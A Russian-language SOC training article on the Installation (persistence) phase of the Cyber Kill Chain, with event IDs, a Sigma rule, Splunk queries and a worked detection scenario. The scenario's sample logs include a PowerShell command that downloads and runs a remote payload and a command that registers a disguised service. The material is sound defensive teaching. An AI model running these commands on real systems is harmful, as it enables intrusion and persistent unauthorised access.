# Установка (Installation) в модели Cyber Kill Chain

## 1. Этап «Установка» в жизненном цикле атаки: контекст и ключевые отличия

Фаза **Installation** (установка) — пятый по счёту этап классического семишагового Cyber Kill Chain, разработанного компанией Lockheed Martin в 2011 году. Она следует непосредственно за фазой **Exploitation** (эксплуатация), во время которой вредоносный код впервые получает выполнение в целевой системе, и предшествует фазе **Command & Control (C2)** (управление), когда злоумышленник устанавливает двусторонний канал для дистанционного управления скомпрометированным узлом. Основное назначение этапа Installation — закрепиться в системе, обеспечить персистентность присутствия и подготовить среду для последующих действий нарушителя.

Исходное определение Lockheed Martin описывает этот этап так: «Immediately following the Exploitation phase, the malware or other attack vector will be installed on the victim’s system. This is a turning point in the attack lifecycle, as the threat actor has entered the system and can now assume control.» Иными словами, именно в этот момент атакующий из внешнего субъекта, пытающегося проникнуть в систему, превращается во внутреннюю угрозу, обладающую возможностью исполнять произвольные действия. Такая перемена статуса объясняет, почему этап Installation часто называют поворотным пунктом всей цепочки атаки.

Важно сразу разграничить три смежные фазы, которые нередко путают начинающие аналитики SOC: **Эксплуатация**, **Установка** и **C2**. Хотя на практике события могут накладываться друг на друга, их концептуальное разделение критически необходимо для точного реагирования и детектирования.

| Элемент | Назначение | Типичные действия | Основные артефакты и индикаторы | Временные рамки |
|----------|------------|-------------------|-------------------------------|----------------|
| **Exploitation** (фаза 4) | Выполнение вредоносного кода | Использование уязвимости, запуск эксплойта, обход защит | Аварийные завершения процессов, ошибки приложений, записи EDR об эксплуатации | Кратковременно (секунды/минуты) |
| **Installation** (фаза 5) | Закрепление, обеспечение повторного входа | Установка backdoor, трояна, web-shell, создание записей автозапуска, регистрация службы | Создание файлов, изменения реестра/конфигурационных файлов, регистрация сервисов, подозрительные процессы без GUI | Минуты/часы; может быть многоэтапной |
| **Command & Control** (фаза 6) | Удалённое управление и связь с нарушителем | Обращение к C2-серверу, передача маяков (beacons), получение команд | Сетевые соединения с нестандартными портами, DNS-туннелирование, периодические HTTP(S)-запросы | Длительно (дни/недели) |

Смешение фазы Installation с C2 возникает из-за того, что многие современные средства удалённого доступа (RAT) одновременно выполняют и закрепление, и коммуникацию. Однако методологически обнаружение установки опирается прежде всего на события изменения конфигурации системы (файловой системы, реестра, планировщика), тогда как признаками C2 являются сетевые аномалии. Разделение этих двух этапов позволяет службе безопасности обнаружить угрозу ещё до того, как она перейдёт к активному выполнению задачи злоумышленника — именно в этом заложена защитная ценность модели Kill Chain.

В модели **MITRE ATT&CK** этапу Installation в основном соответствует тактика **Persistence** (закрепление), хотя часть действий может также подпадать под **Execution** (выполнение) или **Defense Evasion** (обход защиты). Например, создание запланированной задачи классифицируется как Persistence (T1053), а регистрация расширения оболочки — как Persistence через реестр (T1547). Тем не менее, оригинальный Kill Chain остаётся полезным для высокоуровневого планирования обороны, тогда как матрица ATT&CK даёт более детальную картину на уровне техник.

Артефакты фазы установки, согласно исследованию Котенко и соавторов (2022), включают «следы, характеризующие используемые при установке методы и процедуры, данные файлов журналов, мониторинга сети и затронутых хостов, а также результаты криминалистической экспертизы использованных вредоносных программ (например, остатков файлов) и рабочих станций». Иными словами, аналитик SOC L1 должен уметь выявить косвенные признаки деятельности по закреплению, даже если вредоносное ПО уже активно не функционирует.

Из перечисленного видно, что этап Installation — не просто установка вредоносной программы; это целенаправленный процесс конфигурирования среды жертвы для поддержания скрытности и живучести. Понимание его границ помогает выстроить правильную приоритизацию инцидентов: если атака обнаружена на стадии эксплуатации, достаточно заблокировать процесс; но если она прошла в стадию установки, требуется полномасштабное расследование и поиск всех закреплённых механизмов.

## 2. Инструменты и техники закрепления в системе

Фаза Installation охватывает широкий спектр действий, направленных на то, чтобы вредоносное ПО сохранялось на хосте после перезагрузки, выхода пользователя из системы или закрытия уязвимости. Условно все механизмы можно разделить на две крупные группы: **установка вредоносного исполняемого артефакта** и **встраивание в автозагрузочные механизмы ОС**. На практике они часто комбинируются.

### 2.1. Классификация устанавливаемых артефактов

1. **Backdoor** (бэкдор) — программа, открывающая скрытый канал доступа в обход стандартных методов аутентификации. Может быть реализована как отдельный исполняемый файл, динамическая библиотека или скрипт.
2. **Remote Access Trojan** (RAT) — троян удалённого администрирования, предоставляющий графический или консольный интерфейс для управления заражённой машиной. Часто обладает функциями кейлоггинга, снятия скриншотов, загрузки файлов.
3. **Web-shell** — скрипт (ASP, PHP, JSP), загружаемый на веб-сервер и позволяющий выполнять команды ОС через HTTP-запросы. Актуально для веб-приложений.
4. **Rootkit** — набор средств, модифицирующих ядро, драйверы или библиотеки для скрытия присутствия вредоносного ПО. Установка может включать замену системных компонентов.
5. **Loader/Dropper** — программа, чья задача — доставить и запустить основную полезную нагрузку после первичного проникновения. Сама по себе может устанавливаться для отложенного выполнения.

Установленный артефакт может оставаться в виде файла на диске или существовать исключительно в памяти (fileless). В последнем случае вредоносный код хранится в реестре, WMI-репозитории или конфигурационных файлах без создания нового исполняемого файла.

### 2.2. Основные механизмы автозапуска и персистентности

Злоумышленник использует штатные возможности ОС, чтобы его код автоматически запускался при входе в систему, старте служб или срабатывании триггеров. Ниже приведена сводка наиболее распространённых методов, детектируемых в SOC.

| Метод закрепления | ОС | Техника MITRE ATT&CK | Типичное расположение | Ключевые события для обнаружения |
|-------------------|----|----------------------|-----------------------|---------------------------------|
| Run Keys (реестр) | Windows | T1547.001 | HKCU\Software\Microsoft\Windows\CurrentVersion\Run, HKLM\…\Run, RunOnce и др. | Sysmon EID 13 (RegistryEvent) с типом SetValue; Windows Event 4657 |
| Запланированные задания | Windows | T1053.005 | %SystemRoot%\System32\Tasks\ (XML-файлы) | EventID 4698 (создание задания), 106 (регистрация задачи в журнале Task Scheduler) |
| Службы Windows (Services) | Windows | T1543.003 | Реестр HKLM\System\CurrentControlSet\Services | EventID 7045 (System log) — создание службы; Sysmon EID 13, 7 (Image load) |
| WMI Event Subscription | Windows | T1546.003 | Репозиторий WMI, фильтры событий | Sysmon EID 19 (WmiEventFilter), 20 (WmiEventConsumer), 21 (WmiEventBinding) |
| DLL Side-Loading / Hijacking | Windows | T1574.001 | Замена легитимной DLL в каталогах приложений | Sysmon EID 7 (ImageLoad) с нестандартным путём, FileCreate Event ID 11 |
| Login Items (автозагрузка) | macOS | T1547.015 | /Library/LaunchAgents, /Library/LaunchDaemons | Мониторинг файловой системы, plist-файлы |
| Cron | Linux | T1053.003 | /etc/crontab, /var/spool/cron/crontabs/ | Аудит файловой системы (inotify), записи изменений в /etc/crontab |
| Systemd Units | Linux | T1543.002 | /etc/systemd/system/ | Создание .service-файлов, аудит systemctl |
| Shell configuration scripts | Linux/macOS | T1546.004 | ~/.bashrc, ~/.bash_profile, /etc/profile.d/ | Аудит файлов, аномальное содержимое |
| LD_PRELOAD (разделяемые библиотеки) | Linux | T1574.006 | /etc/ld.so.preload, переменная окружения | Мониторинг файлов, syslog |

Помимо классических методов, злоумышленники активно применяют **LOLBins** (Living Off the Land Binaries) — легитимные утилиты системы, позволяющие избежать подозрений. Например, команда `reg add` для модификации реестра, `schtasks` для создания заданий, `sc` для установки служб, `wmic` для создания WMI-подписок. Вредоносный код может доставляться в виде закодированного скрипта PowerShell, который выполняется при входе пользователя без сохранения на диск: для этого достаточно внести соответствующую строку в ключ Run реестра.

Важно понимать, что этап Installation часто растянут во времени и выполняется в несколько заходов. Сначала на целевую систему доставляется небольшой дроппер, который проверяет наличие антивируса, собирает информацию о среде, и только потом загружает основную полезную нагрузку. Сама установка может идти с использованием техник обфускации, шифрования или упаковки, чтобы обойти статические сигнатуры.

## 3. Обнаружение активности этапа установки в SOC уровня 1

Оператор SOC L1 должен уметь по косвенным признакам идентифицировать переход атаки в фазу установки. Так как эта стадия связана с модификацией системы, её индикаторы достаточно конкретны и поддаются формализации в правилах корреляции. Основными источниками данных служат журналы ОС, расширенный аудит конечных точек (Sysmon, EDR-сенсоры) и сетевые устройства.

### 3.1. Ключевые события Windows и их интерпретация

Наиболее информативные идентификаторы событий для выявления установки на платформе Windows:

- **EventID 7045** (Service Control Manager) — регистрация новой службы. Аналитику необходимо проверять, соответствует ли имя службы известному легитимному ПО, не содержит ли её путь временных каталогов (`Temp`, `AppData`), не запускаются ли интерпретаторы (`cmd.exe`, `powershell.exe`, `wscript.exe`) с неожиданными аргументами.
- **EventID 4697** (Security) — установка службы (включая учётную запись, под которой она будет запускаться). Позволяет отследить, если злоумышленник настраивает службу с высокими привилегиями.
- **Sysmon EID 13** — изменение реестра. Конкретно ценны записи с путями `*\CurrentVersion\Run*`, `*\Services\`, `*\Shell` и т.п.
- **Sysmon EID 11** — создание файла. Появление исполняемых файлов в нестандартных каталогах (`C:\Users\*\AppData\Roaming\`, `C:\ProgramData\`, временные папки) должно немедленно проверяться.
- **Sysmon EID 19–21** — WMI-подписки. События редкие, но явно указывают на попытку скрытого автозапуска.
- **Sysmon EID 1** — создание процесса. Если родительским процессом выступает офисное приложение, браузер или другой сетевой клиент, а дочерним оказываетcя `powershell.exe`, `cmd.exe`, `mshta.exe` — это типичный паттерн дроппера.

Аналитику не обязательно помнить все Event ID, но понимание их смысла позволяет строить быстрые поисковые запросы.

### 3.2. Практическое использование правил детектирования

Для автоматизации мониторинга в SOC широко применяются правила на языке Sigma. Ниже представлена *иллюстративная структура* правила, нацеленного на обнаружение создания службы с подозрительными параметрами (конкретные значения строк подбираются под среду):

```yaml
title: Обнаружение установки подозрительной службы Windows
description: Служба создаётся с командной строкой, содержащей интерпретаторы или подозрительные пути.
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
        ImagePath:
            - '*\Temp\\*'
            - '*powershell*'
            - '*cmd.exe*'
            - '*vssadmin.exe*'
            - '*certutil.exe*'
    condition: selection
falsepositives:
    - Легитимные установщики, инсталляционные скрипты, временные обновления.
level: medium
```

Такие правила загружаются в SIEM-платформы (Splunk, Elastic, Sentinel) и после сопоставления генерируют алерты. Аналитик L1 должен, получив алерт, выполнить тривиальную верификацию: связать событие с другими индикаторами в рамках того же хоста, проверить репутацию исполняемого файла (достаточно хеша через открытые базы), оценить временной контекст (ночные часы, внезапное появление в изолированной сети).

Помимо статических правил, EDR-решения уровня CrowdStrike, SentinelOne или Vectra AI позволяют просматривать графы процессов и автоматически выявлять аномальные цепочки. Например, SentinelOne подчёркивает, что на этапе установки их технология «ActiveEDR monitors system activity to identify and block malicious activity» и способна «изолировать затронутые конечные точки, как только обнаружены подозрительные действия». В SOC L1 аналитик может воспользоваться готовыми алертами и дашбордами Kill Chain, но умение написать собственный поисковый запрос остаётся обязательным компетенцией.

### 3.3. Примеры поисковых запросов в SIEM

Допустим, среда использует Splunk с данными Sysmon. Быстрый поиск свежих записей реестра Run:

```bash
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=13
| regex TargetObject="(?i)Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
| table _time, Computer, Image, TargetObject, Details
| reverse
```

Для поиска новых служб за последние 24 часа:

```bash
index=windows sourcetype="WinEventLog:System" EventCode=7045
| where _time > relative_time(now(), "-24h")
| eval ServicePath=mvindex(ServicePath, 0)
| search ServicePath="*Temp*" OR ServicePath="*AppData*"
| table _time, host, ServiceName, ServicePath
```

Аналитик L1 может использовать подобные запросы, но он должен знать о распространённых ложных срабатываниях. Легитимные обновления Windows, инсталляции доверенного ПО также создают службы и правят реестр. Вот почему обязательна контекстная проверка: если установка происходит одновременно на десятках хостов с одинаковым образом ПО — скорее всего, это плановая операция админов. Если же на отдельно взятом сервере в 3 часа ночи появляется служба с именем `WinUpdateSvc`, а ImagePath указывает на `C:\Users\jdoe\AppData\Local\Temp\update.exe`, то это кандидат на немедленную эскалацию.

### 3.4. Мониторинг в Linux-средах

Для Linux-хостов фаза Installation проявляется в изменениях файлов в системных каталогах, создании crontab-задач, регистрации systemd-юнитов. В отсутствие развитого EDR SOC аналитики используют команды аудита (`auditd`) и файлового мониторинга. Например, добавление задания в crontab фиксируется событием:

```bash
type=PROCTITLE msg=audit(…): proctitle=crontab
type=PATH msg=audit(…): name="/var/spool/cron/crontabs/root" inode=…
```

Настройка аудита на ключевые каталоги (`/etc/cron*`, `/etc/systemd/system/`, `/etc/init.d/`) позволяет регистрировать подозрительные изменения. Однако в смешанных средах с централизованным сбором логов чаще опираются на EDR-агенты, которые нормализуют события в единый формат.

Таким образом, оператор SOC L1 не должен ждать алерта о вредоносном ПО — он может активно искать артефакты установки через формализованные поиски и тем самым перехватывать атаку на критически важном этапе.

## 4. Сквозной практический пример: выявление установки вредоносной службы на Windows-сервере

Для закрепления теоретического материала рассмотрим типовой сценарий атаки на корпоративный сервер под управлением Windows Server 2019. Инструментарий атакующего минимален: используется фишинг и штатные средства Windows (PowerShell). Защита: EDR-датчик (Sysmon) и централизованный сбор логов в Splunk.

### 4.1. Исходные условия

- Цель: сервер SRV-APP01, на котором работает сотрудник бухгалтерии с правами локального администратора (что является нарушением политик, но распространено на практике).
- Вектор: электронное письмо с вложением `invoice.docx`, содержащим вредоносный макрос.
- Задача злоумышленника: установить бэкдор для последующего доступа.
- SOC L1 имеет доступ к журналам Sysmon и Windows Event.

### 4.2. Шаги атаки и соответствующие артефакты

**Шаг 1. Пользователь открывает документ, макрос выполняется, порождая процесс PowerShell.**

Действие: макрос вызывает `powershell.exe` с аргументом `-ExecutionPolicy Bypass -WindowStyle Hidden`, который загружает скрипт из удалённого источника.

Артефакт: Sysmon EventID 1 (Process Creation). В журнале появляется запись о создании процесса `powershell.exe` с родительским процессом `WINWORD.EXE`.

```json
{
  "EventID": 1,
  "UtcTime": "2026-05-20 09:15:32.123",
  "ProcessGuid": "{A23EAE89-...}",
  "ProcessId": 4092,
  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/payload')\"",
  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
  "ParentProcessId": 3804
}
```

Результат: аналитик видит подозрительную цепочку «офисное приложение → интерпретатор», классический индикатор фишинга с макросом. Это даёт основание начать мониторинг активности на узле.

**Шаг 2. PowerShell загружает исполняемый файл и сохраняет его на диск.**

Действие: скрипт загружает файл `svchost32.exe` (маскируется под системный процесс, но сохраняется в нестандартную папку) и сразу регистрирует его как службу.

Артефакт: Sysmon EventID 11 (FileCreate), показывающий появление нового исполняемого файла в `C:\Users\jdoe\AppData\Local\Temp\svchost32.exe`, и EventID 22 (DNS query) с запросом к домену `payload.c2domain.example`.

```json
{
  "EventID": 11,
  "UtcTime": "2026-05-20 09:15:34.001",
  "ProcessGuid": "{A23EAE89-...}",
  "ProcessId": 4092,
  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "TargetFilename": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe"
}
```

Аналитик сопоставляет время создания файла с запуском PowerShell и делает вывод, что дроппер доставил полезную нагрузку.

**Шаг 3. Злоумышленник создаёт новую службу с помощью легитимного `sc.exe` (или напрямую через PowerShell).**

Команда, предположительно выполненная дроппером:

```powershell
New-Service -Name "WinUpdateSvc" -BinaryPathName "C:\Users\jdoe\AppData\Local\Temp\svchost32.exe" -StartupType Automatic
```

Артефакт: EventID 7045 в журнале System. Запись фиксирует создание службы с произвольным именем и путём к вредоносному файлу.

```text
Log Name:      System
Source:        Service Control Manager
Event ID:      7045
Task Category: None
Level:         Information
Description:
A service was installed in the system.

Service Name:  WinUpdateSvc
Service File Name:  C:\Users\jdoe\AppData\Local\Temp\svchost32.exe
Service Type:  user mode service
Service Start Type:  auto start
```

Такое событие практически однозначно свидетельствует о переходе атаки в фазу установки. Аналитик L1 должен немедленно заэскалировать этот инцидент.

**Шаг 4. Служба запускается, вредоносный процесс начинает маяковать на C2-сервер.**

Артефакт: Sysmon EventID 1 для процесса `svchost32.exe` (его родителем будет `services.exe`), и следом EventID 3 (NetworkConnection) — исходящее соединение на порт 443/TCP к `203.0.113.10`.

```json
{
  "EventID": 3,
  "UtcTime": "2026-05-20 09:16:00.500",
  "ProcessGuid": "{A23EAE89-...}",
  "ProcessId": 4312,
  "Image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe",
  "SourceIp": "192.168.10.15",
  "DestinationIp": "203.0.113.10",
  "DestinationPort": 443
}
```

На этом этапе установка переходит в фазу Command & Control, что подтверждает успешное закрепление злоумышленника.

### 4.3. Ожидаемый вывод

Представленный пример демонстрирует, как последовательность артефактов Sysmon и Windows Event Logs позволяет надежно идентифицировать фазу Installation. Обнаружение может произойти на шаге 3 (создание службы) — это идеальный момент для блокировки, поскольку вредоносное ПО ещё не начало активную коммуникацию. Даже если EDR автоматически не сгенерировал алерт, аналитик L1, выполняющий ручной поиск по событиям создания файлов и регистрации служб, заметит аномалию. Сквозной характер наблюдения — от фишинга до маяка — также облегчает реконструкцию всей атаки и позволяет удостовериться, что вредоносный механизм удалён полностью, а не временно заглушен.
